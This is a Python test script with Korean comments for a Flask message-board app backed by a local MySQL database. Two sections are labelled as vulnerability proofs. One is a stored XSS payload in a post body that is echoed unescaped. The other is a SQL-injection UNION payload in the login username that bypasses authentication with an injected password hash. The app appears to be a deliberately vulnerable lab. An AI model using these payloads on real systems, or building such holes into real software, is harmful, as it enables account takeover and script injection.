# 로컬 MySQL(Docker) 대상 테스트. 실행법은 README 참고.
import os

import pymysql

os.environ.setdefault("DB_PORT", "3307")
os.environ.setdefault("DB_USER", "root")
os.environ.setdefault("DB_PASSWORD", "test")
os.environ["DB_NAME"] = "board_test"
os.environ["INSECURE_COOKIE"] = "1"  # 테스트 클라이언트는 HTTP라 Secure 쿠키를 끈다

conn = pymysql.connect(host=os.environ.get("DB_HOST", "127.0.0.1"), port=int(os.environ["DB_PORT"]),
                       user=os.environ["DB_USER"], password=os.environ["DB_PASSWORD"])
with conn, conn.cursor() as cur:
    cur.execute("DROP DATABASE IF EXISTS board_test")
    cur.execute("CREATE DATABASE board_test DEFAULT CHARSET utf8mb4")

from app import app  # noqa: E402

a, b = app.test_client(), app.test_client()
assert a.post("/write", data={"title": "x", "body": "y"}).status_code == 302  # 비로그인 → 로그인으로
for c, name in ((a, "alice"), (b, "bob")):
    c.post("/register", data={"username": name, "password": "pass1234"})
    assert c.post("/login", data={"username": name, "password": "pass1234"}).status_code == 302
assert "이미 있는" in a.post("/register", data={"username": "alice", "password": "pass1234"}).text
assert "틀렸습니다" in b.post("/login", data={"username": "bob", "password": "wrong"}).text
a.post("/write", data={"title": "<script>x</script>", "body": "<script>alert('xss')</script>"})
assert "&lt;script&gt;" in a.get("/").text  # 목록 제목은 여전히 이스케이프됨
# VULN 증명: Stored XSS — 본문은 이스케이프 없이 그대로 출력된다
assert "<script>alert('xss')</script>" in a.get("/post/1").text
b.post("/post/1/delete")  # 남의 글 삭제 시도
assert a.get("/post/1").status_code == 200

# VULN 증명: SQL Injection — UNION으로 공격자가 아는 해시를 끼워 넣어 로그인 우회
from werkzeug.security import generate_password_hash  # noqa: E402
h = generate_password_hash("hacked")
payload = "' UNION SELECT 999,'hacker','%s' -- " % h
attacker = app.test_client()
r = attacker.post("/login", data={"username": payload, "password": "hacked"})
assert r.status_code == 302  # 해시 검증이 살아 있어도 UNION 주입으로 로그인 성공
assert attacker.get("/write").status_code == 200  # 세션이 실제로 생성됨(로그인된 상태)

a.post("/post/1/delete")
assert a.get("/post/1").status_code == 404
print("OK")
